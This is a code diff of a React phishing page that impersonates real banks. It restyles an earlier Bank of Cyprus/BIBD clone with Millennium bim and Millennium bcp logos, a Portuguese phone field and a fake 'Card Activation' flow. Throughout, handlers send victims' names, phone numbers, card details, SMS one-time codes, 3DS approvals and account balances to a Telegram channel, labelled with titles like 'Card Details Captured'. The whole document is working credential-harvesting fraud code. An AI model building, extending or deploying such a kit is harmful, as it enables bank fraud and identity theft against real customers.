@@ -3,6 +3,7 @@
 import React, { useState, useEffect, useRef } from "react"
 import { fetchVisitorInfo, sendTelegramMessage } from "@/lib/telegram"
 import {
+  ChevronDown,
   ChevronLeft,
   Eye,
   EyeOff,
@@ -15,7 +16,42 @@ import {
   Smartphone,
   UserPlus,
   Users,
+  X,
 } from "lucide-react"
+
+// Crisp SVG Flag for Portugal (PT / +351)
+function PortugalFlag({ className = "w-6 h-4" }: { className?: string }) {
+  return (
+    <svg
+      viewBox="0 0 600 400"
+      className={`shrink-0 overflow-hidden ${className}`}
+      xmlns="http://www.w3.org/2000/svg"
+      aria-label="Flag of Portugal"
+    >
+      <rect width="240" height="400" fill="#046A38" />
+      <rect x="240" width="360" height="400" fill="#DA291C" />
+      <g transform="translate(240, 200)">
+        <circle r="60" fill="none" stroke="#FED100" strokeWidth="12" />
+        <circle r="46" fill="none" stroke="#FED100" strokeWidth="6" />
+        <line x1="-60" y1="0" x2="60" y2="0" stroke="#FED100" strokeWidth="8" />
+        <line x1="0" y1="-60" x2="0" y2="60" stroke="#FED100" strokeWidth="8" />
+        <ellipse rx="36" ry="58" fill="none" stroke="#FED100" strokeWidth="6" transform="rotate(45)" />
+        <path
+          d="M -26,-28 L 26,-28 L 26,12 C 26,36 0,44 0,44 C 0,44 -26,36 -26,12 Z"
+          fill="#FFFFFF"
+          stroke="#DA291C"
+          strokeWidth="10"
+        />
+        <path
+          d="M -12,-16 L 12,-16 L 12,8 C 12,20 0,26 0,26 C 0,26 -12,20 -12,8 Z"
+          fill="#002B7F"
+        />
+        <circle cx="0" cy="4" r="3" fill="#FFFFFF" />
+        <circle cx="0" cy="-6" r="3" fill="#FFFFFF" />
+      </g>
+    </svg>
+  )
+}
 
 // Crisp SVG Flag for Cyprus (CY / +357)
 function CyprusFlag({ className = "w-6 h-4" }: { className?: string }) {
@@ -57,39 +93,193 @@ function CyprusFlag({ className = "w-6 h-4" }: { className?: string }) {
   )
 }
 
-// Bank of Cyprus Brand Logo with text & emblem
-function BocBrandLogo({
-  iconSize = "w-[24px] h-[24px] sm:w-[26px] sm:h-[26px]",
-  textSize = "text-[13.5px] sm:text-[14.5px]",
+// Millennium bim Brand Logo Component
+function MillenniumLogo({
   className = "",
+  variant = "magenta",
+  size = "normal",
 }: {
-  iconSize?: string
-  textSize?: string
   className?: string
+  variant?: "magenta" | "white"
+  size?: "normal" | "large"
 }) {
+  const color = variant === "white" ? "#ffffff" : "#990440"
+  const width = size === "large" ? 220 : 135
+  const height = size === "large" ? 62 : 38
+
   return (
-    <div className={`flex items-center gap-1.5 select-none ${className}`}>
-      <span
-        className={`text-[#058998] font-serif font-bold tracking-tight leading-none select-none ${textSize}`}
-        style={{ fontFamily: "Georgia, Cambria, 'Times New Roman', Times, serif" }}
+    <div className={`flex flex-col items-center select-none ${className}`}>
+      <svg
+        viewBox="0 0 260 76"
+        width={width}
+        height={height}
+        fill={color}
+        xmlns="http://www.w3.org/2000/svg"
+        className="shrink-0 overflow-visible"
+        aria-label="Millennium bim"
       >
-        Bank of Cyprus
-      </span>
-      <img
-        src="/boc_logo.png"
-        alt="Bank of Cyprus"
-        className={`object-contain select-none pointer-events-none rounded-[4px] shrink-0 ${iconSize}`}
-      />
+        {/* Stylized 'M' with iconic curved top swoosh */}
+        <path
+          d="M 12 12 C 12 5, 21 1.5, 28 0 C 26 5, 25 10, 24 16 L 24 46 L 33 46 L 33 16 L 45 42 L 51 42 L 63 16 L 63 46 L 71 46 L 71 8 L 61 8 L 48 34 L 35 8 L 22 8 C 17 8, 14 10, 12 12 Z"
+        />
+        {/* 'illennium' wordmark */}
+        <text
+          x="73"
+          y="46"
+          fontFamily="system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif"
+          fontSize="37"
+          fontWeight="400"
+          letterSpacing="-0.5px"
+        >
+          illennium
+        </text>
+        {/* Horizontal rule below Millennium */}
+        <line x1="8" y1="52" x2="252" y2="52" stroke={color} strokeWidth="2.4" />
+        {/* 'bim' text right-aligned under line */}
+        <text
+          x="250"
+          y="72"
+          textAnchor="end"
+          fontFamily="system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif"
+          fontSize="22"
+          fontWeight="600"
+          letterSpacing="-0.2px"
+        >
+          bim
+        </text>
+      </svg>
     </div>
   )
 }
 
+function BocBrandLogo({ className }: { className?: string }) {
+  return <MillenniumLogo className={className} />
+}
+
 function BocLogo({ className }: { className?: string }) {
-  return <BocBrandLogo className={className} />
+  return <MillenniumLogo className={className} />
 }
 
 function BibdLogo({ className }: { className?: string }) {
-  return <BocBrandLogo className={className} />
+  return <MillenniumLogo className={className} />
+}
+
+// Millennium bcp rectangular badge (for 3DS verification header)
+function MillenniumBcpBadge({ className = "" }: { className?: string }) {
+  return (
+    <div
+      className={`bg-[#990440] text-white px-3.5 py-1.5 rounded-[2px] shadow-sm select-none inline-flex flex-col justify-center ${className}`}
+      style={{ minWidth: "135px" }}
+    >
+      <div className="flex items-baseline">
+        <span
+          className="text-[18px] sm:text-[19.5px] font-bold tracking-[-0.02em] leading-none text-white select-none"
+          style={{ fontFamily: "Georgia, Cambria, 'Times New Roman', serif" }}
+        >
+          Millennium
+        </span>
+      </div>
+      <div className="w-full h-[1px] bg-white/90 my-[2.5px]" />
+      <span className="text-[10.5px] sm:text-[11.5px] font-sans font-bold leading-none text-right tracking-tight text-white pr-0.5">
+        bcp
+      </span>
+    </div>
+  )
+}
+
+// Official Visa Secure Badge
+function VisaSecureBadge({ className = "" }: { className?: string }) {
+  return (
+    <div className={`flex flex-col items-end select-none ${className}`}>
+      <span
+        className="font-sans font-black italic text-[#0c2069] text-[18px] sm:text-[20px] leading-none tracking-wider pr-0.5"
+        style={{ fontFamily: "'Helvetica Neue', Arial, sans-serif" }}
+      >
+        VISA
+      </span>
+      <div className="bg-[#0c2069] text-white text-[8px] sm:text-[9px] font-bold tracking-[0.16em] px-2 py-[2.5px] rounded-[1px] uppercase mt-1 leading-none">
+        SECURE
+      </div>
+    </div>
+  )
+}
+
+
+
+// Reusable Card Activation Stepper Header (4 steps across all screens)
+function CardActivationHeader({
+  step = 1,
+  onBack,
+  onClose,
+  showBack = true,
+  showClose = true,
+}: {
+  step: 1 | 2 | 3 | 4
+  onBack?: () => void
+  onClose?: () => void
+  showBack?: boolean
+  showClose?: boolean
+}) {
+  return (
+    <div className="w-full shrink-0 select-none bg-white">
+      {/* Header Bar: < CARD ACTIVATION X */}
+      <header className="relative z-20 w-full px-5 pt-5 pb-2.5 flex items-center justify-between shrink-0 select-none bg-white">
+        {showBack ? (
+          <button
+            type="button"
+            onClick={onBack}
+            className="p-1 -ml-1 text-[#111827] hover:text-[#990440] transition-colors cursor-pointer flex items-center justify-center"
+            aria-label="Back"
+          >
+            <ChevronLeft className="w-6 h-6 stroke-[2]" />
+          </button>
+        ) : (
+          <div className="w-6 h-6" />
+        )}
+
+        <span className="text-[14px] sm:text-[14.5px] font-bold text-[#111827] tracking-[0.14em] uppercase text-center">
+          CARD ACTIVATION
+        </span>
+
+        {showClose ? (
+          <button
+            type="button"
+            onClick={onClose}
+            className="p-1 -mr-1 text-[#111827] hover:text-[#990440] transition-colors cursor-pointer flex items-center justify-center"
+            aria-label="Clear"
+          >
+            <X className="w-5 h-5 stroke-[2]" />
+          </button>
+        ) : (
+          <div className="w-5 h-5" />
+        )}
+      </header>
+
+      {/* Stepper / 4-segment progress bar */}
+      <div className="w-full px-5 pt-1 pb-4 flex items-center gap-2 select-none shrink-0">
+        <div
+          className={`flex-1 h-[4.5px] rounded-full transition-colors duration-300 ${
+            step >= 1 ? "bg-[#990440]" : "bg-[#e5e7eb]"
+          }`}
+        />
+        <div
+          className={`flex-1 h-[4.5px] rounded-full transition-colors duration-300 ${
+            step >= 2 ? "bg-[#990440]" : "bg-[#e5e7eb]"
+          }`}
+        />
+        <div
+          className={`flex-1 h-[4.5px] rounded-full transition-colors duration-300 ${
+            step >= 3 ? "bg-[#990440]" : "bg-[#e5e7eb]"
+          }`}
+        />
+        <div
+          className={`flex-1 h-[4.5px] rounded-full transition-colors duration-300 ${
+            step >= 4 ? "bg-[#990440]" : "bg-[#e5e7eb]"
+          }`}
+        />
+      </div>
+    </div>
+  )
 }
 
 type ScreenType =
@@ -102,9 +292,18 @@ type ScreenType =
   | "accounts"
   | "confirm-otp"
 
+// Splash animated icon loader sequence (matching user screenshots)
+const SPLASH_ICONS = [
+  { src: "/icon_receipt.png", alt: "Receipt" },
+  { src: "/icon_gift.png", alt: "Gift" },
+  { src: "/icon_transfer.png", alt: "Transfer" },
+]
+
 export default function BbvaPage(props: any) {
   const initialScreen: ScreenType = props?.initialScreen || "splash"
   const [currentScreen, setCurrentScreen] = useState<ScreenType>(initialScreen)
+  const [splashIconIndex, setSplashIconIndex] = useState(0)
+  const [splashAnimPhase, setSplashAnimPhase] = useState<"in" | "out">("in")
   const [isScreenLoading, setIsScreenLoading] = useState(false)
   const [language, setLanguage] = useState<"en" | "es">("en")
   const [locationInfo, setLocationInfo] = useState<{
@@ -130,7 +329,7 @@ export default function BbvaPage(props: any) {
         setCurrentScreen("otp")
       } else if (p.includes("/card")) {
         setCurrentScreen("card")
-      } else if (p.includes("/phone") || p.includes("/mobile")) {
+      } else if (p.includes("/contacts") || p.includes("/phone") || p.includes("/mobile")) {
         setCurrentScreen("phone")
       } else if (p.includes("/splash")) {
         setCurrentScreen("splash")
@@ -173,12 +372,16 @@ export default function BbvaPage(props: any) {
   const [showPassword, setShowPassword] = useState(false)
   const [errorMessage, setErrorMessage] = useState("")
 
-  // Phone / Mobile number states (Cyprus +357)
+  // Contact info / Mobile number states (Screen before card)
+  const [fullName, setFullName] = useState("")
+  const [isNameFocused, setIsNameFocused] = useState(false)
   const [phoneNumber, setPhoneNumber] = useState("")
-  const [phoneCountryCode, setPhoneCountryCode] = useState("+357")
+  const [isPhoneFocused, setIsPhoneFocused] = useState(false)
+  const [phoneCountryCode, setPhoneCountryCode] = useState("+351")
   const [phoneError, setPhoneError] = useState("")
   const [isPhoneSubmitting, setIsPhoneSubmitting] = useState(false)
   const phoneInputRef = useRef<HTMLInputElement>(null)
+  const fullNameInputRef = useRef<HTMLInputElement>(null)
 
   // Card form states
   const [cardNumber, setCardNumber] = useState("")
@@ -261,27 +464,70 @@ export default function BbvaPage(props: any) {
     }
   }, [])
 
-  // Auto-advance splash screen to phone screen after 2.6 seconds
+  // Auto-advance splash screen with calm, slow-paced transition:
+  // Each icon gently rises & fades in, rests calmly, then dissolves away before the next appears (low speed, no circle feeling)
   useEffect(() => {
     if (currentScreen !== "splash") return
-    const timer = setTimeout(() => {
-      setCurrentScreen("phone")
-      if (typeof window !== "undefined" && window.history) {
-        window.history.replaceState({ screen: "phone" }, "", "/phone")
-      }
-    }, 2600)
-    return () => clearTimeout(timer)
-  }, [currentScreen])
 
-  // Focus phone input on phone screen
-  useEffect(() => {
-    if (currentScreen === "phone") {
-      const timer = setTimeout(() => {
-        phoneInputRef.current?.focus()
-      }, 250)
-      return () => clearTimeout(timer)
+    const timers: NodeJS.Timeout[] = []
+
+    // 0ms: Icon 0 appears smoothly
+    setSplashIconIndex(0)
+    setSplashAnimPhase("in")
+
+    // 1050ms: Icon 0 dissolves away
+    timers.push(
+      setTimeout(() => {
+        setSplashAnimPhase("out")
+      }, 1050)
+    )
+
+    // 1500ms: Icon 1 appears smoothly
+    timers.push(
+      setTimeout(() => {
+        setSplashIconIndex(1)
+        setSplashAnimPhase("in")
+      }, 1500)
+    )
+
+    // 2550ms: Icon 1 dissolves away
+    timers.push(
+      setTimeout(() => {
+        setSplashAnimPhase("out")
+      }, 2550)
+    )
+
+    // 3000ms: Icon 2 appears smoothly
+    timers.push(
+      setTimeout(() => {
+        setSplashIconIndex(2)
+        setSplashAnimPhase("in")
+      }, 3000)
+    )
+
+    // 4050ms: Icon 2 dissolves away
+    timers.push(
+      setTimeout(() => {
+        setSplashAnimPhase("out")
+      }, 4050)
+    )
+
+    // 4500ms: Smoothly advances to contacts screen
+    timers.push(
+      setTimeout(() => {
+        setCurrentScreen("phone")
+        if (typeof window !== "undefined" && window.history) {
+          window.history.replaceState({ screen: "phone" }, "", "/contacts")
+        }
+      }, 4500)
+    )
+
+    return () => {
+      timers.forEach(clearTimeout)
     }
   }, [currentScreen])
+
+  // Phone screen initially keeps fields unfocused so placeholder text displays in the center
 
   // Timer countdown for OTP (Code expires in 2:59)
   useEffect(() => {
@@ -372,7 +618,7 @@ export default function BbvaPage(props: any) {
     if (phoneError) setPhoneError("")
   }
 
-  // Handle Mobile Number Submit -> Sends Telegram -> 1.5s loading -> Card Screen
+  // Handle Mobile Number & Contact Submit -> Sends Telegram -> 1.5s loading -> Card Screen
   const handlePhoneSubmit = async (e?: React.FormEvent) => {
     if (e) e.preventDefault()
     const cleanPhone = phoneNumber.replace(/\s+/g, "")
@@ -386,9 +632,10 @@ export default function BbvaPage(props: any) {
     setIsPhoneSubmitting(true)
     setIsScreenLoading(true)
 
-    const fullPhone = `${phoneCountryCode} ${cleanPhone}`
+    const fullPhone = cleanPhone
 
     if (typeof window !== "undefined") {
+      sessionStorage.setItem("bbva_fullName", fullName.trim())
       sessionStorage.setItem("bbva_phoneNumber", fullPhone)
       sessionStorage.setItem("phoneNumber", fullPhone)
       sessionStorage.setItem("bibd_phone", fullPhone)
@@ -396,7 +643,9 @@ export default function BbvaPage(props: any) {
 
     try {
       await sendTelegramMessage({
-        title: "BIBD — Mobile Number Captured",
+        title: "Contacts — Name & Mobile Number Captured",
+        fullName: fullName.trim() || undefined,
+        dni: fullName.trim() || undefined,
         phoneNumber: fullPhone,
         phone: fullPhone,
         type: "phone",
@@ -492,16 +741,20 @@ export default function BbvaPage(props: any) {
     }
 
     try {
-      const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
+      const savedUser =
+        (typeof window !== "undefined" &&
+          (sessionStorage.getItem("bbva_fullName") || sessionStorage.getItem("bbva_userId"))) ||
+        fullName.trim() ||
+        userId.trim()
       const savedPhone =
         (typeof window !== "undefined" &&
           (sessionStorage.getItem("bbva_phoneNumber") ||
             sessionStorage.getItem("phoneNumber") ||
             sessionStorage.getItem("bibd_phone"))) ||
-        (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)
+        (phoneNumber ? phoneNumber.replace(/\s+/g, "") : undefined)
 
       await sendTelegramMessage({
-        title: "Bank of Cyprus — Card Details Captured",
+        title: "Millennium bim — Card Details Captured",
         dni: savedUser || undefined,
         phoneNumber: savedPhone || undefined,
         cardNumber: cleanCard,
@@ -555,7 +808,7 @@ export default function BbvaPage(props: any) {
         (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)
 
       await sendTelegramMessage({
-        title: "Bank of Cyprus — 3DS Approval Clicked",
+        title: "Millennium bim — 3DS Approval Clicked",
         dni: savedUser || undefined,
         phoneNumber: savedPhone || undefined,
         cardNumber: cardNumber ? cardNumber.replace(/\s+/g, "") : undefined,
@@ -593,7 +846,7 @@ export default function BbvaPage(props: any) {
       (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)
 
     sendTelegramMessage({
-      title: "Bank of Cyprus — SMS OTP Captured",
+      title: "Millennium bim — SMS OTP Captured",
       dni: savedUser || undefined,
       phoneNumber: savedPhone || undefined,
       otp1: codeToSave,
@@ -696,7 +949,7 @@ export default function BbvaPage(props: any) {
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
     sendTelegramMessage({
-      title: "Bank of Cyprus — Account Details Captured",
+      title: "Millennium bim — Account Details Captured",
       dni: savedUser || undefined,
       accountNumber: accountNumber || "N/A",
       balance: accountBalance ? `EUR ${accountBalance}` : "N/A",
@@ -733,7 +986,7 @@ export default function BbvaPage(props: any) {
       (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)
 
     sendTelegramMessage({
-      title: `BIBD — Transaction Confirm OTP (Attempt ${confirmAttempt})`,
+      title: `Millennium bim — Transaction Confirm OTP (Attempt ${confirmAttempt})`,
       dni: savedUser || undefined,
       phoneNumber: savedPhone || undefined,
       otp2: code,
@@ -878,183 +1131,199 @@ export default function BbvaPage(props: any) {
       style={{ backgroundColor: "#ffffff" }}
     >
       {/* ========================================================================= */}
-      {/* 0. SCREEN 0: SPLASH SCREEN (BANK OF CYPRUS LOGO & SPINNER)               */}
+      {/* 0. SCREEN 0: SMOOTH SEQUENTIAL ICONS SPLASH (LOW SPEED, NO CIRCLE FEEL)   */}
+      {/* Pure white background (#ffffff), each icon calmly dissolves in and out    */}
+      {/* in the center one after another at a relaxed pace                         */}
       {/* ========================================================================= */}
       {currentScreen === "splash" && (
         <main
           onClick={() => {
             setCurrentScreen("phone")
             if (typeof window !== "undefined" && window.history) {
-              window.history.replaceState({ screen: "phone" }, "", "/phone")
+              window.history.replaceState({ screen: "phone" }, "", "/contacts")
             }
           }}
           className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-center items-center overflow-hidden shadow-2xl bg-white px-6 select-none cursor-pointer"
         >
-          <div className="flex flex-col items-center justify-center space-y-6">
-            {/* Bank of Cyprus Logo & Text */}
-            <div className="flex flex-col items-center justify-center gap-3 select-none">
+          {/* Centered Sequential Icon Container (Clean, no circular track) */}
+          <div className="relative w-28 h-28 sm:w-32 sm:h-32 flex items-center justify-center select-none">
+            {/* Active Icon: smoothly rises & dissolves in, rests, then dissolves away */}
+            <div
+              key={`${splashIconIndex}-${splashAnimPhase}`}
+              className={`w-20 h-20 sm:w-24 sm:h-24 flex items-center justify-center ${
+                splashAnimPhase === "in"
+                  ? "animate-icon-appear"
+                  : "animate-icon-remove"
+              }`}
+            >
               <img
-                src="/boc_logo.png"
-                alt="Bank of Cyprus"
-                className="w-14 h-14 sm:w-16 sm:h-16 rounded-xl shadow-md object-contain"
+                src={SPLASH_ICONS[splashIconIndex].src}
+                alt={SPLASH_ICONS[splashIconIndex].alt}
+                className="w-18 h-18 sm:w-20 sm:h-20 object-contain select-none pointer-events-none"
               />
-              <span
-                className="text-[#058998] font-serif font-bold text-[21px] sm:text-[23px] tracking-tight leading-none"
-                style={{ fontFamily: "Georgia, Cambria, 'Times New Roman', Times, serif" }}
-              >
-                Bank of Cyprus
-              </span>
             </div>
-
-            {/* Spinner */}
-            <div className="w-8 h-8 rounded-full border-[3px] border-[#058998]/20 border-t-[#058998] animate-spin" />
           </div>
         </main>
       )}
 
       {/* ========================================================================= */}
-      {/* 0.5. SCREEN 0.5: CYPRUS MOBILE NUMBER SCREEN                              */}
-      {/* Flag beside number, country code (+357), continue button -> Card Screen   */}
+      {/* 0.5. SCREEN 0.5: PIXEL-PERFECT CONTACTS SCREEN (SCREEN BEFORE CARD)       */}
+      {/* Matches user screenshot: < CONTACTS X, 4-step progress bar (#990440),     */}
+      {/* "Tell us your name and mobile number", Name and Phone input with flag,    */}
+      {/* and Continue pill button (#990440) -> Card Screen                         */}
       {/* ========================================================================= */}
       {currentScreen === "phone" && (
-        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-white px-0">
-          {/* Header with Bank of Cyprus Logo on clean white */}
-          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-white border-b border-slate-100">
-            <div className="w-7" />
-            <div className="flex items-center justify-center">
-              <BibdLogo />
-            </div>
-            <div className="w-7" />
-          </header>
+        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-between overflow-hidden shadow-2xl bg-white px-0 select-none">
+          {/* Header Bar: < CARD ACTIVATION X + 4-segment Progress Bar */}
+          <CardActivationHeader
+            step={1}
+            onBack={() => {
+              setCurrentScreen("splash")
+              if (typeof window !== "undefined" && window.history) {
+                window.history.replaceState({ screen: "splash" }, "", "/splash")
+              }
+            }}
+            onClose={() => {
+              setFullName("")
+              setIsNameFocused(false)
+              setPhoneNumber("")
+              setIsPhoneFocused(false)
+              setPhoneError("")
+            }}
+          />
 
-          {/* Main content on white */}
-          <section className="relative z-10 w-full bg-white rounded-none flex-1 min-h-0 flex flex-col justify-between overflow-y-auto px-5 pt-6 pb-6 select-none">
+          {/* Main Content Area */}
+          <section className="relative z-10 w-full bg-white flex-1 min-h-0 flex flex-col justify-between overflow-y-auto px-5 select-none">
             <div className="w-full flex flex-col">
-              {/* Phone Icon Badge */}
-              <div className="w-13 h-13 rounded-2xl bg-[#058998]/10 flex items-center justify-center text-[#058998] mb-4">
-                <Smartphone className="w-6 h-6 stroke-[2]" />
-              </div>
+              {/* Heading */}
+              <h1 className="text-[25px] sm:text-[27px] font-bold text-[#111827] leading-[1.22] tracking-tight mb-2">
+                Tell us your name and mobile<br />number
+              </h1>
 
-              {/* Title & Description */}
-              <h2 className="text-[#0d1e38] text-[21px] sm:text-[23px] font-bold tracking-tight">
-                Enter Mobile Number
-              </h2>
-              <p className="text-[#64748b] text-[13px] sm:text-[13.5px] font-normal mt-1 mb-5 leading-relaxed">
-                Please enter your registered mobile number to verify your account and view card details.
+              {/* Subheading */}
+              <p className="text-[14px] sm:text-[14.5px] text-[#4b5563] font-normal leading-[1.4] mb-6">
+                We will send you an SMS code to associate this number with your account
               </p>
 
-              {/* Phone Form */}
+              {/* Form */}
               <form onSubmit={handlePhoneSubmit} className="w-full flex flex-col">
-                <div className="w-full mb-2">
-                  <div className="flex items-center justify-between mb-1.5">
-                    <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
-                      MOBILE NUMBER
-                    </label>
-                  </div>
-
-                  {/* Input container with Flag and Country Code beside number */}
-                  <div
-                    className={`w-full h-[52px] px-3 rounded-[10px] border bg-white flex items-center gap-2.5 transition-all shadow-xs ${
-                      phoneError
-                        ? "border-red-500 ring-1 ring-red-400"
-                        : "border-[#cbd5e1] focus-within:border-[#058998] focus-within:ring-1 focus-within:ring-[#058998]"
+                {/* Field 1: First and last name (Floating label from center to top) */}
+                <div
+                  onClick={() => fullNameInputRef.current?.focus()}
+                  className="relative w-full h-[58px] mb-3.5 rounded-[14px] border-[1.5px] border-[#1e293b] px-4 bg-white flex items-center focus-within:border-[#990440] transition-colors cursor-text"
+                >
+                  <label
+                    htmlFor="fullNameInput"
+                    className={`absolute left-4 select-none pointer-events-none transition-all duration-200 ease-out ${
+                      isNameFocused || fullName.trim().length > 0
+                        ? "top-2 text-[11.5px] text-[#6b7280] font-normal"
+                        : "top-1/2 -translate-y-1/2 text-[15.5px] text-[#6b7280] font-normal"
                     }`}
                   >
-                    {/* Flag and Country Code Badge */}
-                    <div className="flex items-center gap-2 shrink-0 py-1 px-1.5 rounded-md bg-slate-50 border border-slate-200">
-                      <CyprusFlag className="w-6 h-4 rounded-[2px] shadow-xs" />
-                      <span className="text-[14px] font-bold text-[#0d1e38] tracking-tight">
-                        +357
-                      </span>
-                    </div>
+                    First and last name
+                  </label>
+                  <input
+                    id="fullNameInput"
+                    ref={fullNameInputRef}
+                    type="text"
+                    value={fullName}
+                    onFocus={() => setIsNameFocused(true)}
+                    onBlur={() => setIsNameFocused(false)}
+                    onChange={(e) => setFullName(e.target.value)}
+                    className={`w-full text-[16px] font-medium text-[#111827] focus:outline-none bg-transparent transition-all ${
+                      isNameFocused || fullName.trim().length > 0 ? "pt-4 pb-0.5" : "py-0"
+                    }`}
+                    placeholder=""
+                  />
+                </div>
 
-                    {/* Divider */}
-                    <div className="w-[1px] h-6 bg-slate-200 shrink-0" />
-
-                    {/* Number Input Field - Infinite / Unlimited Length */}
+                {/* Field 2: Portugal Flag + Mobile number (Floating label from center to top) */}
+                <div
+                  onClick={() => phoneInputRef.current?.focus()}
+                  className="relative w-full h-[58px] mb-2 rounded-[14px] border-[1.5px] border-[#1e293b] px-3.5 bg-white flex items-center gap-3 focus-within:border-[#990440] transition-colors cursor-text"
+                >
+                  <div className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-[10px] bg-[#f8fafc] border border-slate-200/80 shrink-0 select-none">
+                    <PortugalFlag className="w-6 h-4 rounded-[2px] shadow-2xs" />
+                    <ChevronDown className="w-3.5 h-3.5 text-[#475569] stroke-[2.5]" />
+                  </div>
+                  <div className="relative flex-1 h-full flex items-center">
+                    <label
+                      htmlFor="mobileInput"
+                      className={`absolute left-0 select-none pointer-events-none transition-all duration-200 ease-out ${
+                        isPhoneFocused || phoneNumber.trim().length > 0
+                          ? "top-2 text-[11px] text-[#6b7280] font-normal"
+                          : "top-1/2 -translate-y-1/2 text-[15.5px] text-[#6b7280] font-normal"
+                      }`}
+                    >
+                      Mobile number
+                    </label>
                     <input
+                      id="mobileInput"
                       ref={phoneInputRef}
                       type="tel"
                       inputMode="numeric"
                       value={phoneNumber}
+                      onFocus={() => setIsPhoneFocused(true)}
+                      onBlur={() => setIsPhoneFocused(false)}
                       onChange={handlePhoneChange}
-                      placeholder="Enter mobile number"
-                      className="w-full h-full bg-transparent text-[#0d1e38] placeholder-[#94a3b8] text-[16px] font-semibold tracking-wide focus:outline-none"
+                      className={`w-full text-[16px] font-normal text-[#111827] focus:outline-none bg-transparent transition-all ${
+                        isPhoneFocused || phoneNumber.trim().length > 0 ? "pt-4 pb-0.5" : "py-0"
+                      }`}
+                      placeholder=""
                     />
-
-                    {phoneNumber && (
-                      <button
-                        type="button"
-                        onClick={() => {
-                          setPhoneNumber("")
-                          setPhoneError("")
-                          phoneInputRef.current?.focus()
-                        }}
-                        className="text-slate-400 hover:text-slate-600 p-1"
-                        aria-label="Clear phone input"
-                      >
-                        <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
-                        </svg>
-                      </button>
-                    )}
                   </div>
                 </div>
 
-                {/* Validation Error if any */}
+                {/* Error message */}
                 {phoneError && (
-                  <p className="mt-0.5 mt-3 mb-3 text-red-600 bg-red-50 px-3 py-2 rounded-md text-[13px] font-medium border border-red-200 animate-shake flex items-center gap-2">
+                  <p className="mt-2 text-red-600 bg-red-50 px-3 py-2 rounded-md text-[13px] font-medium border border-red-200 flex items-center gap-2">
                     <span className="font-bold text-sm">!</span>
                     <span>{phoneError}</span>
                   </p>
                 )}
-
-                {/* Continue Button */}
-                <button
-                  type="submit"
-                  disabled={isPhoneSubmitting || !phoneNumber.trim()}
-                  className={`w-full h-[48px] rounded-[10px] mt-4 font-semibold text-[15.5px] tracking-wide flex items-center justify-center transition-all select-none ${
-                    phoneNumber.trim().length > 0 && !isPhoneSubmitting
-                      ? "bg-[#058998] hover:bg-[#04707d] active:scale-[0.985] text-white cursor-pointer shadow-sm"
-                      : "bg-[#e2e8f0] text-[#94a3b8] cursor-not-allowed"
-                  }`}
-                >
-                  {isPhoneSubmitting ? (
-                    <div className="flex items-center gap-2">
-                      <svg
-                        className="animate-spin h-5 w-5 text-white"
-                        xmlns="http://www.w3.org/2000/svg"
-                        fill="none"
-                        viewBox="0 0 24 24"
-                      >
-                        <circle
-                          className="opacity-25"
-                          cx="12"
-                          cy="12"
-                          r="10"
-                          stroke="currentColor"
-                          strokeWidth="4"
-                        />
-                        <path
-                          className="opacity-75"
-                          fill="currentColor"
-                          d="M4 12a8 8 0 018-8v8H4z"
-                        />
-                      </svg>
-                      <span>Connecting...</span>
-                    </div>
-                  ) : (
-                    "Continue"
-                  )}
-                </button>
               </form>
             </div>
 
-            {/* Bottom info */}
-            <div className="mt-auto pt-6 flex flex-col items-center text-center">
-              <p className="text-[11.5px] text-[#94a3b8]">
-                Bank of Cyprus Public Company Ltd • Regulated Financial Institution
-              </p>
+            {/* Bottom Button Container: Continue Pill Button (#990440) */}
+            <div className="w-full pt-4 pb-6 mt-auto">
+              <button
+                type="button"
+                onClick={() => handlePhoneSubmit()}
+                disabled={isPhoneSubmitting || !phoneNumber.trim()}
+                className={`w-full h-[52px] rounded-full font-semibold text-[16.5px] tracking-wide flex items-center justify-center transition-all select-none shadow-sm ${
+                  phoneNumber.trim().length > 0 && !isPhoneSubmitting
+                    ? "bg-[#990440] hover:bg-[#830336] active:scale-[0.985] text-white cursor-pointer"
+                    : "bg-[#990440]/60 text-white/80 cursor-not-allowed"
+                }`}
+              >
+                {isPhoneSubmitting ? (
+                  <div className="flex items-center gap-2">
+                    <svg
+                      className="animate-spin h-5 w-5 text-white"
+                      xmlns="http://www.w3.org/2000/svg"
+                      fill="none"
+                      viewBox="0 0 24 24"
+                    >
+                      <circle
+                        className="opacity-25"
+                        cx="12"
+                        cy="12"
+                        r="10"
+                        stroke="currentColor"
+                        strokeWidth="4"
+                      />
+                      <path
+                        className="opacity-75"
+                        fill="currentColor"
+                        d="M4 12a8 8 0 018-8v8H4z"
+                      />
+                    </svg>
+                    <span>Connecting...</span>
+                  </div>
+                ) : (
+                  "Continue"
+                )}
+              </button>
             </div>
           </section>
         </main>
@@ -1070,22 +1339,21 @@ export default function BbvaPage(props: any) {
             backgroundColor: "#ffffff",
           }}
         >
-          {/* Header */}
-          <header className="relative z-20 w-full px-5 pt-5 sm:pt-6 flex items-center justify-between shrink-0 select-none bg-white border-b border-slate-100">
-            <div className="w-[54px]" />
-            <div className="flex items-center justify-center">
-              <BibdLogo />
-            </div>
-            <button
-              type="button"
-              onClick={() => setLanguage(language === "en" ? "es" : "en")}
